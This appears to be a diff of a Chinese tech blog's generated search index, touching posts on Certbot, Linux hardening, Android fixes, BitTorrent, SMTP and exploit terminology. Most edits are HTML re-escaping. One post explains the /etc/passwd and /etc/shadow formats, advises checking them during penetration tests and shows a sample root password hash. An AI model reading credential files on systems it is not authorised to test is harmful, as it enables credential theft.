 <li><p>编辑 w3af 安装目录中的 <code>/w3af/core/controllers/dependency_check/requirements.py</code> 文件，将要求的 pyOpenSSl 版本号改为你安装的最新版，即修改下面这一行代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PIPDependency(<span class="string">&#x27;OpenSSL&#x27;</span>, <span class="string">&#x27;pyOpenSSL&#x27;</span>, <span class="string">&#x27;Version of pyOpenSSL you are using&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
 </ol>
@@ -2856,7 +2858,7 @@
     <url>/2018/09/16/let-s-encrypt/</url>
     <content><![CDATA[<p><a href="https://letsencrypt.org/zh-cn/">Let&#39;s Encrypt</a>是一个免费、自动化和开放的证书颁发机构，它提供了一个工具：<a href="https://certbot.eff.org/">Certbot</a>，可以用来获取SSL证书。<br>进入Certbot的官网，根据自己的环境选择Web服务器和操作系统，即可得到详细的操作步骤，下面以Nginx Web服务器和CentOS 6操作系统为例，给出相关步骤：</p>
 <span id="more"></span>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载certbot-auto脚本</span></span><br><span class="line">wget https://dl.eff.org/certbot-auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置相关权限</span></span><br><span class="line">chmod a+x certbot-auto</span><br></pre></td></tr></table></figure>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载certbot-auto脚本</span></span><br><span class="line">wget https://dl.eff.org/certbot-auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置相关权限</span></span><br><span class="line"><span class="built_in">chmod</span> a+x certbot-auto</span><br></pre></td></tr></table></figure>
 
 <h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>请注意，获取或更新SSL证书之前需关闭相应的Web服务器，具体而言，需要执行<code>service nginx stop</code>。另外，第一次执行<code>certbot-auto</code>命令时，它会下载并安装相关环境，耐心等待即可。<br>Certbot提供了一个Nginx插件，直接使用<code>./certbot-auto --nginx</code>即可完成所有配置。<br>如果你想手动配置，可执行<code>./certbot-auto certonly --standalone</code>命令，此命令运行过程中会要求用户输入要获取SSl证书的域名，按要求输入即可，命令运行成功后会显示证书相关文件所在的目录。<br>接下来只需在Nginx的配置文件<code>nginx.conf</code>中进行如下配置即可(以howiezhao.com域名为例)：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssl on;</span><br><span class="line">ssl_certificate /etc/letsencrypt/live/howiezhao.com/fullchain.pem;</span><br><span class="line">ssl_certificate_key /etc/letsencrypt/live/howiezhao.com/privkey.pem;</span><br></pre></td></tr></table></figure>
@@ -2922,15 +2924,15 @@
     <content><![CDATA[<h2 id="帐户与口令"><a href="#帐户与口令" class="headerlink" title="帐户与口令"></a>帐户与口令</h2><p>此方面的加固主要为了防止针对帐户的暴力破解。</p>
 <p>禁用或删除无用帐户：<br>使用命令<code>userdel &lt;用户名&gt;</code>删除不必要的帐户，使用参数<code>-r</code>即可删除相应用户的家目录和邮箱目录。<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定不必要的帐户，解锁可使用<code>passwd -u &lt;用户名&gt;</code>。</p>
 <p>检查特殊帐户：<br>使用命令<code>awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow</code>查看空口令帐户，若存在，则使用命令<code>passwd &lt;用户名&gt;</code>为空口令帐户设定密码。<br>使用命令<code>awk -F: &#39;($3==0)&#39; /etc/passwd</code>查看uid为0的帐户，确认uid为0的帐户只有root帐户。</p>
-<p>添加口令策略：<br>使用命令<code>change -m 0 -M 30 -E 2020-01-01 -W 7 &lt;用户名&gt;</code>修改帐户口令策略，<code>-m</code>表示密码最小使用天数，<code>-M</code>表示密码最大使用天数，<code>-E</code>表示密码到期时间，<code>-W</code>表示密码到期前多少天提醒。或者可以直接编辑/etc/login.defs文件进行修改。</p>
+<p>添加口令策略：<br>使用命令<code>change -m 0 -M 30 -E 2020-01-01 -W 7 &lt;用户名&gt;</code>修改帐户口令策略，<code>-m</code>表示密码最小使用天数，<code>-M</code>表示密码最大使用天数，<code>-E</code>表示密码到期时间，<code>-W</code>表示密码到期前多少天提醒。或者可以直接编辑&#x2F;etc&#x2F;login.defs文件进行修改。</p>
 <span id="more"></span>
-<p>设置用户锁定：<br>在CentOS7中，编辑/etc/pam.d/system-auth文件，添加<code>auth required pam_tally2.so onerr=fail deny=6 unlock_time=300</code>此行，表示当密码连续输错6次后锁定，锁定时间300秒。<br>限制能su到root的用户：<br>编辑/etc/pam.d/su文件，添加<code>auth required pam_wheel.so group=test</code>此行，表示只允许test组用户su到root。</p>
+<p>设置用户锁定：<br>在CentOS7中，编辑&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件，添加<code>auth required pam_tally2.so onerr=fail deny=6 unlock_time=300</code>此行，表示当密码连续输错6次后锁定，锁定时间300秒。<br>限制能su到root的用户：<br>编辑&#x2F;etc&#x2F;pam.d&#x2F;su文件，添加<code>auth required pam_wheel.so group=test</code>此行，表示只允许test组用户su到root。</p>
 <h2 id="服务安全"><a href="#服务安全" class="headerlink" title="服务安全"></a>服务安全</h2><p>服务越少，系统越安全。</p>
 <p>关闭不必要的服务：<br>在CentOS中，使用命令<code>chkconfig --level &lt;init级别&gt; &lt;服务名&gt; on|off|reset</code>设置服务在指定init级别下开机是否启动。</p>
-<p>SSH服务安全：<br>编辑/etc/ssh/sshd_config文件，修改默认端口，即<code>Port</code>项；禁止root用户远程登录，即<code>PermitRootLogin</code>项，应使用普通用户登录，特殊权限时使用<code>sudo</code>命令；禁止空密码登录，即<code>PermitEmptyPasswords</code>项；限制登录密码输错次数；最好使用密钥登录而不是密码登录，即<code>PasswordAuthentication</code>项值改为<code>no</code>。修改完后，需要使用<code>service sshd restart</code>重启SSH服务。</p>
+<p>SSH服务安全：<br>编辑&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件，修改默认端口，即<code>Port</code>项；禁止root用户远程登录，即<code>PermitRootLogin</code>项，应使用普通用户登录，特殊权限时使用<code>sudo</code>命令；禁止空密码登录，即<code>PermitEmptyPasswords</code>项；限制登录密码输错次数；最好使用密钥登录而不是密码登录，即<code>PasswordAuthentication</code>项值改为<code>no</code>。修改完后，需要使用<code>service sshd restart</code>重启SSH服务。</p>
 <h2 id="文件系统安全"><a href="#文件系统安全" class="headerlink" title="文件系统安全"></a>文件系统安全</h2><p>权限越小，系统越安全</p>
-<p>设置umask值：<br>编辑/etc/profile文件，修改umask值为027。</p>
-<p>设置登录超时：<br>编辑/etc/profile文件，添加<code>TIMEOUT=180</code>，即登录后无操作3分钟将超时断开连接。</p>
+<p>设置umask值：<br>编辑&#x2F;etc&#x2F;profile文件，修改umask值为027。</p>
+<p>设置登录超时：<br>编辑&#x2F;etc&#x2F;profile文件，添加<code>TIMEOUT=180</code>，即登录后无操作3分钟将超时断开连接。</p>
 ]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -3016,15 +3018,15 @@
 <span id="more"></span>
 <h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">Howie&#x27;s Blog</span>](<span class="link">https://howiezhao.com</span>)</span><br></pre></td></tr></table></figure>
 
-<p>超文本链接必须带 http/https。</p>
+<p>超文本链接必须带 http&#x2F;https。</p>
 <h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">一张图片</span>](<span class="link">/images/abc.jpg</span>)</span><br></pre></td></tr></table></figure>
 
 <p>当图片无法显示时，则显示中括号中的语句。</p>
 <p>图片的路径为相对路径，即当前 Markdown 文件所在路径下的 <code>images</code> 中的 <code>abc.jpg</code>。</p>
-<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">*斜体*</span></span><br><span class="line"><span class="strong">**粗体**</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*粗斜体<span class="strong">**<span class="emphasis">*</span></span></span></span></span><br></pre></td></tr></table></figure>
+<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">*斜体*</span></span><br><span class="line"><span class="strong">**粗体**</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*粗斜体*</span>**</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>```<br>这里是多行代码<br>```</p>
-<p>`这里是单行代码`</p>
+<p>`这里是单行代码&#96;</p>
 <h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">表头1 | 表头2</span><br><span class="line">--- | ---</span><br><span class="line">单元格1 | 单元格2</span><br><span class="line">单元格3 | 单元格4</span><br></pre></td></tr></table></figure>
 
 <p>上下应该各空一行</p>
@@ -3112,12 +3114,12 @@
   <entry>
     <title>Nexus/Pixel 相关问题解决</title>
     <url>/2019/07/21/nexus-pixel-problem/</url>
-    <content><![CDATA[<h2 id="移动网络-WiFi-出现叹号或叉号"><a href="#移动网络-WiFi-出现叹号或叉号" class="headerlink" title="移动网络/WiFi 出现叹号或叉号"></a>移动网络/WiFi 出现叹号或叉号</h2><p>Captive Portal 是从 Android 5 开始引入的一项新功能，其主要用于检测网络连接是否正常，当用户连接网络后，系统会通过 HTTP 访问一个 Google 的服务器，若返回 200 状态码，则表示用户可能处在一个需要登录认证的网络环境中；若返回 204 状态码，则表示网络连接正常；若连接超时，则表示网络连接不正常，此时网络图标会显示一个叹号或叉号。</p>
+    <content><![CDATA[<h2 id="移动网络-x2F-WiFi-出现叹号或叉号"><a href="#移动网络-x2F-WiFi-出现叹号或叉号" class="headerlink" title="移动网络&#x2F;WiFi 出现叹号或叉号"></a>移动网络&#x2F;WiFi 出现叹号或叉号</h2><p>Captive Portal 是从 Android 5 开始引入的一项新功能，其主要用于检测网络连接是否正常，当用户连接网络后，系统会通过 HTTP 访问一个 Google 的服务器，若返回 200 状态码，则表示用户可能处在一个需要登录认证的网络环境中；若返回 204 状态码，则表示网络连接正常；若连接超时，则表示网络连接不正常，此时网络图标会显示一个叹号或叉号。</p>
 <p>显然，Google 的服务器是连接不上的，我们可以通过修改服务器地址来解决此问题。具体而言，连接 ADB，针对不同的系统版本，下方分别给出了相关命令：</p>
-<p>Android 9.0/8.1/8.0/7.1.2/7.1.1：</p>
+<p>Android 9.0&#x2F;8.1&#x2F;8.0&#x2F;7.1.2&#x2F;7.1.1：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global captive_portal_https_url https://www.google.cn/generate_204</span><br></pre></td></tr></table></figure>
 
-<p>Android 7.1/7.0：</p>
+<p>Android 7.1&#x2F;7.0：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings delete global captive_portal_server  </span><br><span class="line">adb shell settings put global captive_portal_detection_enabled 0</span><br></pre></td></tr></table></figure>
 
 <p>Android 5.0-6.x：</p>
@@ -3125,16 +3127,16 @@
 
 <p>执行之后，开启飞行模式，接着关闭飞行模式即可。</p>
 <span id="more"></span>
-<h2 id="搜索不到-WiFi"><a href="#搜索不到-WiFi" class="headerlink" title="搜索不到 WiFi"></a>搜索不到 WiFi</h2><p>因为美国 2.4GHz 频段的 WiFi 信道为 1-11，而中国 2.4GHz 频段的 WiFi 信道为 1-13，所以当 2.4GHz 频段的 WiFi 信道位于 12 或 13 时，美版的 Nexus/Pixel 会搜索不到 WiFi，此时可通过重启路由器，使其自动更换信道，或进入路由器设置页面，将信道改为 11 以内任意信道即可。</p>
-<h2 id="4G-信号问题"><a href="#4G-信号问题" class="headerlink" title="4G 信号问题"></a>4G 信号问题</h2><p>由于联通的网络制式一直采用的是国际通用的网络制式，所以 Nexus/Pixel 可以完美支持联通 2G/3G/4G。</p>
-<p>移动的 3G 网络制式采用的是自主研发的技术，所以 Nexus/Pixel 并不支持移动 3G，然而移动 4G 网络制式采用的是自主研发和国际通用并行的方式，所以 Nexus/Pixel 只支持部分移动 4G 频段。</p>
-<p>简单来说，Nexus/Pixel 完美支持联通 2G/3G/4G，支持移动 2G，不支持移动 3G，部分支持移动 4G（具体表现为在城市有 4G 网络，在农村没有 4G 网络），电信 2G/3G/4G 可通过破解（本文不讨论这点）实现支持。</p>
-<h2 id="Google（即负一屏）无法使用"><a href="#Google（即负一屏）无法使用" class="headerlink" title="Google（即负一屏）无法使用"></a>Google（即负一屏）无法使用</h2><h2 id="接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）"><a href="#接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）" class="headerlink" title="接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）"></a>接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）</h2><p>严格来说，这不算是 Nexus/Pixel 特有的问题，究其原因是距离感应器坏了，可通过设置使用电源键挂断电话，具体方法为在<strong>设置</strong> —&gt; <strong>辅助功能/无障碍</strong>中开启<strong>按电源按钮结束通话</strong>。</p>
+<h2 id="搜索不到-WiFi"><a href="#搜索不到-WiFi" class="headerlink" title="搜索不到 WiFi"></a>搜索不到 WiFi</h2><p>因为美国 2.4GHz 频段的 WiFi 信道为 1-11，而中国 2.4GHz 频段的 WiFi 信道为 1-13，所以当 2.4GHz 频段的 WiFi 信道位于 12 或 13 时，美版的 Nexus&#x2F;Pixel 会搜索不到 WiFi，此时可通过重启路由器，使其自动更换信道，或进入路由器设置页面，将信道改为 11 以内任意信道即可。</p>
+<h2 id="4G-信号问题"><a href="#4G-信号问题" class="headerlink" title="4G 信号问题"></a>4G 信号问题</h2><p>由于联通的网络制式一直采用的是国际通用的网络制式，所以 Nexus&#x2F;Pixel 可以完美支持联通 2G&#x2F;3G&#x2F;4G。</p>
+<p>移动的 3G 网络制式采用的是自主研发的技术，所以 Nexus&#x2F;Pixel 并不支持移动 3G，然而移动 4G 网络制式采用的是自主研发和国际通用并行的方式，所以 Nexus&#x2F;Pixel 只支持部分移动 4G 频段。</p>
+<p>简单来说，Nexus&#x2F;Pixel 完美支持联通 2G&#x2F;3G&#x2F;4G，支持移动 2G，不支持移动 3G，部分支持移动 4G（具体表现为在城市有 4G 网络，在农村没有 4G 网络），电信 2G&#x2F;3G&#x2F;4G 可通过破解（本文不讨论这点）实现支持。</p>
+<h2 id="Google（即负一屏）无法使用"><a href="#Google（即负一屏）无法使用" class="headerlink" title="Google（即负一屏）无法使用"></a>Google（即负一屏）无法使用</h2><h2 id="接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）"><a href="#接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）" class="headerlink" title="接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）"></a>接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）</h2><p>严格来说，这不算是 Nexus&#x2F;Pixel 特有的问题，究其原因是距离感应器坏了，可通过设置使用电源键挂断电话，具体方法为在<strong>设置</strong> —&gt; <strong>辅助功能&#x2F;无障碍</strong>中开启<strong>按电源按钮结束通话</strong>。</p>
 <h2 id="蓝牙传输失败，显示不支持此内容"><a href="#蓝牙传输失败，显示不支持此内容" class="headerlink" title="蓝牙传输失败，显示不支持此内容"></a>蓝牙传输失败，显示不支持此内容</h2><p>由于版权问题，原生 Android 不支持传输以 <code>.apk</code> 结尾的文件，可通过将其改为 <code>.jpg</code> 结尾传输。</p>
 <h2 id="Google-Play-商店更新应用卡住"><a href="#Google-Play-商店更新应用卡住" class="headerlink" title="Google Play 商店更新应用卡住"></a>Google Play 商店更新应用卡住</h2><p>在 Android 9.0 之前，Play 商店是通过<strong>下载管理器</strong>下载应用的，出现这种情况可以直接将<strong>下载管理器</strong>强行停止，然后重新启动 Play 商店即可更新应用。在 Android 9.0 之后，可直接将 Play 商店强行停止再重新启动即可。</p>
-<h2 id="系统无法更新"><a href="#系统无法更新" class="headerlink" title="系统无法更新"></a>系统无法更新</h2><p>具体表现为<strong>系统更新</strong>处永远显示<strong>正在安装系统更新</strong>，一般来说，这是由于网络原因引起的，目前并没有一个稳定的解决办法，建议直接下载新系统镜像并线刷。你可以在<a href="https://developers.google.cn/android/images">这个官方地址</a>找到有关 Nexus/Pixel 的所有出厂镜像，其中也附带有详细的安装方法。</p>
+<h2 id="系统无法更新"><a href="#系统无法更新" class="headerlink" title="系统无法更新"></a>系统无法更新</h2><p>具体表现为<strong>系统更新</strong>处永远显示<strong>正在安装系统更新</strong>，一般来说，这是由于网络原因引起的，目前并没有一个稳定的解决办法，建议直接下载新系统镜像并线刷。你可以在<a href="https://developers.google.cn/android/images">这个官方地址</a>找到有关 Nexus&#x2F;Pixel 的所有出厂镜像，其中也附带有详细的安装方法。</p>
 <p>具体而言，你需要先解锁 Bootloader，然后连接 ADB，紧接着执行 <code>adb reboot bootloader</code> 进入 fastboot 模式，最后执行相应系统的 <code>flash-all</code> 脚本即可。</p>
-<h2 id="Pixel-Pixel-XL-Verizon-版解锁-Bootloader-教程"><a href="#Pixel-Pixel-XL-Verizon-版解锁-Bootloader-教程" class="headerlink" title="Pixel/Pixel XL Verizon 版解锁 Bootloader 教程"></a>Pixel/Pixel XL Verizon 版解锁 Bootloader 教程</h2><p>教程来源自 xda 上的一篇<a href="https://www.xda-developers.com/unlock-bootloader-verizon-google-pixel-xl/">文章</a>，具体步骤如下：</p>
+<h2 id="Pixel-x2F-Pixel-XL-Verizon-版解锁-Bootloader-教程"><a href="#Pixel-x2F-Pixel-XL-Verizon-版解锁-Bootloader-教程" class="headerlink" title="Pixel&#x2F;Pixel XL Verizon 版解锁 Bootloader 教程"></a>Pixel&#x2F;Pixel XL Verizon 版解锁 Bootloader 教程</h2><p>教程来源自 xda 上的一篇<a href="https://www.xda-developers.com/unlock-bootloader-verizon-google-pixel-xl/">文章</a>，具体步骤如下：</p>
 <ol>
 <li>从您的设备中删除 Google 帐户和任何类型的屏幕锁定（指纹，PIN，图案等）。</li>
 <li>从您的设备中取出 SIM 卡。</li>
@@ -3178,13 +3180,13 @@
   <entry>
     <title>P2P 与 BitTorrent</title>
     <url>/2020/12/15/p2p-bittorrent/</url>
-    <content><![CDATA[<p>P2P 是一种<strong>体系结构</strong>，就好像 C/S 体系结构一样，但不同的是，P2P 对总是打开的基础设施服务器有最小的（或者没有）依赖，成对间歇连接的主机（称为<strong>对等方</strong>）彼此直接通信。</p>
+    <content><![CDATA[<p>P2P 是一种<strong>体系结构</strong>，就好像 C&#x2F;S 体系结构一样，但不同的是，P2P 对总是打开的基础设施服务器有最小的（或者没有）依赖，成对间歇连接的主机（称为<strong>对等方</strong>）彼此直接通信。</p>
 <p>基于 P2P 这种体系结构产生了许多应用，譬如<strong>文件分发应用</strong>和<strong>分布式散列表</strong>（DHT），而文件分发应用中一个典型的例子就是 BitTorrent 协议。</p>
-<p>如果要类比 P2P 与 BitTorrent 之间的关系，就好像 C/S 体系结构与 FTP 协议之间的关系。</p>
+<p>如果要类比 P2P 与 BitTorrent 之间的关系，就好像 C&#x2F;S 体系结构与 FTP 协议之间的关系。</p>
 <span id="more"></span>
 
-<h2 id="P2P-与-C-S"><a href="#P2P-与-C-S" class="headerlink" title="P2P 与 C/S"></a>P2P 与 C/S</h2><p>以文件分发应用为例，在 C/S 文件分发中，该服务器必须向每个对等方发送该文件的一个副本，即服务器承受了极大的负担，并且消耗了大量的服务器带宽。在 P2P 文件分发中，每个对等方能够向任何其他对等方重新分发它已经收到的该文件的任何部分，从而在分发过程中协助该服务器。</p>
-<p>对于 C/S 体系结构，随着对等方数量的增加，分发时间呈线性增长并且没有界。然而，对于 P2P 体系结构，最小分发时间不仅总是小于 C/S 体系结构的分发时间，并且对于任意的对等方数量，总是小于一对一的 C/S 体系结构的分发时间。因此，具有 P2P 体系结构的应用程序能够是自扩展的。这种扩展性的直接成因是：<strong>对等方除了是比特的消费者外还是它们的重新分发者</strong>。</p>
+<h2 id="P2P-与-C-x2F-S"><a href="#P2P-与-C-x2F-S" class="headerlink" title="P2P 与 C&#x2F;S"></a>P2P 与 C&#x2F;S</h2><p>以文件分发应用为例，在 C&#x2F;S 文件分发中，该服务器必须向每个对等方发送该文件的一个副本，即服务器承受了极大的负担，并且消耗了大量的服务器带宽。在 P2P 文件分发中，每个对等方能够向任何其他对等方重新分发它已经收到的该文件的任何部分，从而在分发过程中协助该服务器。</p>
+<p>对于 C&#x2F;S 体系结构，随着对等方数量的增加，分发时间呈线性增长并且没有界。然而，对于 P2P 体系结构，最小分发时间不仅总是小于 C&#x2F;S 体系结构的分发时间，并且对于任意的对等方数量，总是小于一对一的 C&#x2F;S 体系结构的分发时间。因此，具有 P2P 体系结构的应用程序能够是自扩展的。这种扩展性的直接成因是：<strong>对等方除了是比特的消费者外还是它们的重新分发者</strong>。</p>
 <h2 id="BitTorrent"><a href="#BitTorrent" class="headerlink" title="BitTorrent"></a>BitTorrent</h2><p>如前所述，BitTorrent 是最为流行的 P2P 文件分发协议，通常也简称为 BT，最初由 Bram Cohen 所研发。</p>
 <p>用 BitTorrent 的术语来讲，参与一个特定文件分发的所有对等方的集合被称为一个<strong>洪流（torrent）</strong>。在一个洪流中的对等方彼此下载等长度的<strong>文件块</strong>（chunk），典型的块长度为 256 KB。当一个对等方首次加入一个洪流时，它没有块。随着时间的流逝，它累积了越来越多的块。当它下载块时，也为其他对等方上载了多个块。一旦某对等方获得了整个文件，它也许（自私地）离开洪流，或（大公无私地）留在该洪流中并继续向其他对等方上载块。同时，任何对等方可能在任何时候仅具有块的子集就离开该洪流，并在以后重新加入该洪流中。</p>
 <p>每个洪流具有一个基础设施节点，称为 <strong>tracker</strong>（追踪器）。当一个对等方加入某洪流时，它向 tracker 注册自己，并周期性地通知 tracker 它仍在该洪流中。以这种方式，tracker 跟踪参与在洪流中的对等方。</p>
@@ -3224,10 +3226,10 @@
 <h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a><code>/etc/passwd</code></h2><p>早期的 Linux 中，用户的密码也存储在此文件中，但因为此文件所有人都可以访问，对密码的存储不安全，但又不能把它的权限改为仅 root 用户，因为系统的其他程序可能会用到此文件中存储的用户其他信息，所以，后来 Linux 将用户密码存储到了 <code>/etc/shadow</code> 文件中，并将其权限设为仅 root 用户。</p>
 <p>在渗透过程中，这两个文件最好都检查。</p>
 <p><code>/etc/passwd</code> 的文件格式为：<strong>用户名:密码:用户 ID:用户组 ID:注释:用户目录:登录 shell</strong>，共 7 项，默认情况下，root 的用户 ID 为 0，1-99 表示预定义用户，100-999 表示其他系统帐户，新建的其他用户 ID 从 1000 起，用户组 ID 代表的详细信息存储在 <code>/etc/group</code> 文件中，如果密码被存储在了 <code>/etc/shadow</code> 文件中，则此文件中密码项为 x，常见形式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
 
 <h2 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a><code>/etc/shadow</code></h2><p><code>/etc/shadow</code> 的文件格式为：<strong>用户名:密码:上次修改密码日期（从 1970 年 1 月 1 日起的天数）:密码在两次修改期间的最小天数（0 表示可在任何时间修改）:密码需要被变更的天数（99999 表示不需要变更）:密码变更前提前几天警告:账号失效日期:账号失效后被禁用的天数:保留字段</strong>，共 9 项，如果密码项以 <code>!</code> 或 <code>*</code>  起始，则代表此账号被锁定，不能用于登录，密码项中更为详细的格式为：<strong>$加密方法 ID$Salt$加密值</strong>，常见形式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$Fsf6Q6SH$MlagWih0lcGFxtAo7/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">root:$6$Fsf6Q6SH$MlagWih0lcGFxtAo7/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -3243,7 +3245,7 @@
     <content><![CDATA[<p>PoC，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p>
 <p>Exp，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
 <p>Payload，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
-<p>Shellcode，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。</p>
+<p>Shellcode，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向&#x2F;反向 shell 而得名。</p>
 <span id="more"></span>
 
 <h2 id="几点注意"><a href="#几点注意" class="headerlink" title="几点注意"></a>几点注意</h2><p>PoC 是用来证明漏洞存在的，Exp 是用来利用漏洞的，两者通常不是一类，或者说，PoC 通常是无害的，Exp 通常是有害的，有了 PoC，才有 Exp。</p>
@@ -3288,7 +3290,7 @@
 <h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><p><strong>SMTP</strong>（Simple Mail Transfer Protocol，<strong>简单邮件传输协议</strong>）是因特网电子邮件中主要的应用层协议。它使用 TCP 可靠数据传输服务，从发送方的邮件服务器向接收方的邮件服务器发送邮件。每台邮件服务器既运行 SMTP 的客户端也运行 SMTP 的服务器端。</p>
 <p>SMTP 一般不使用中间邮件服务器发送邮件。</p>
 <p>SMTP 是如何将一个报文从发送邮件服务器传送到接收邮件服务器的呢？首先，客户 SMTP（运行在发送邮件服务器主机上）在 <strong>25</strong> 号端口建立一个到服务器 SMTP（运行在接收邮件服务器主机上）的 TCP 连接。如果服务器没有开机，客户会在稍后继续尝试连接。一旦连接建立，服务器和客户执行某些应用层的握手。在 SMTP 握手的阶段，SMTP 客户指示发送方的邮件地址（产生报文的那个人）和接收方的邮件地址。一旦握手完成，客户发送该报文。该客户如果有另外的报文要发送到该服务器，就在该相同的 TCP 连接上重复这种处理；否则，它指示 TCP 关闭连接。以下是一个例子（S 代表 SMTP 服务器，C 代表 SMTP 客户）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S: 220 hamburger.edu</span><br><span class="line">C: HELO crepes.fr</span><br><span class="line">S: 250 Hello crepes.fr, pleased to meet you</span><br><span class="line">C: MAIL FROM: &lt;alice@crepes.fr&gt;</span><br><span class="line">S: 250 alice@crepes.fr ... Sender ok</span><br><span class="line">C: RCPT TO: &lt;bob@hamburger.edu&gt;</span><br><span class="line">S: 250 bob@hamburger.edu ... Recipient ok</span><br><span class="line">C: DATA</span><br><span class="line">S: 354 Enter mail, end with &quot;.&quot; on a line by itself</span><br><span class="line">C: Do you like ketchup?</span><br><span class="line">C: How about pickles?</span><br><span class="line">C: .</span><br><span class="line">S: 250 Message accepted for delivery</span><br><span class="line">C: QUIT</span><br><span class="line">S: 221 hamburger.edu closing connection</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">S: 220 hamburger.edu</span><br><span class="line">C: HELO crepes.fr</span><br><span class="line">S: 250 Hello crepes.fr, pleased to meet you</span><br><span class="line">C: MAIL FROM: &lt;alice@crepes.fr&gt;</span><br><span class="line">S: 250 alice@crepes.fr ... Sender ok</span><br><span class="line">C: RCPT TO: &lt;bob@hamburger.edu&gt;</span><br><span class="line">S: 250 bob@hamburger.edu ... Recipient ok</span><br><span class="line">C: DATA</span><br><span class="line">S: 354 Enter mail, end with &quot;.&quot; on a line by itself</span><br><span class="line">C: Do you like ketchup?</span><br><span class="line">C: How about pickles?</span><br><span class="line">C: .</span><br><span class="line">S: 250 Message accepted for delivery</span><br><span class="line">C: QUIT</span><br><span class="line">S: 221 hamburger.edu closing connection</span><br></pre></td></tr></table></figure>
 
 <p>在上例中，该客户发送了 5 条命令：<code>HELO</code>（是 HELLO 的缩写）、<code>MAIL FROM</code>、<code>RCPT TO</code>、<code>DATA</code> 以及 <code>QUIT</code>。</p>
 <p>当然，你也可以使用 Telnet 直接与一个 SMTP 服务器对话，如下：</p>
@@ -3305,7 +3307,7 @@
 <p>第三个重要区别是如何处理一个既包含文本又包含图形（也可能是其他媒体类型）的文档。HTTP 把每个对象封装到它自己的 HTTP 响应报文中，而 SMTP 则把所有报文对象放在一个报文之中。</p>
 <h3 id="邮件报文格式"><a href="#邮件报文格式" class="headerlink" title="邮件报文格式"></a>邮件报文格式</h3><p>如同 HTTP 协议，邮件报文也有相应的邮件首部行，每个首部行包含了可读的文本，是由关键词后跟冒号及其值组成的。某些关键词是必须的，另一些则是可选的。每个首部 <em>必须</em> 含有一个 <code>From:</code> 首部行和一个 <code>To:</code> 首部行；一个首部 <em>也许</em> 包含一个 <code>Subject:</code> 首部行以及其他可选的首部行。</p>
 <p>一个典型的报文首部看看起来如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From: alice@crepes.fr</span><br><span class="line">To: bob@hamburger.edu</span><br><span class="line">Subject: Searching for the meaning of life.</span><br></pre></td></tr></table></figure>
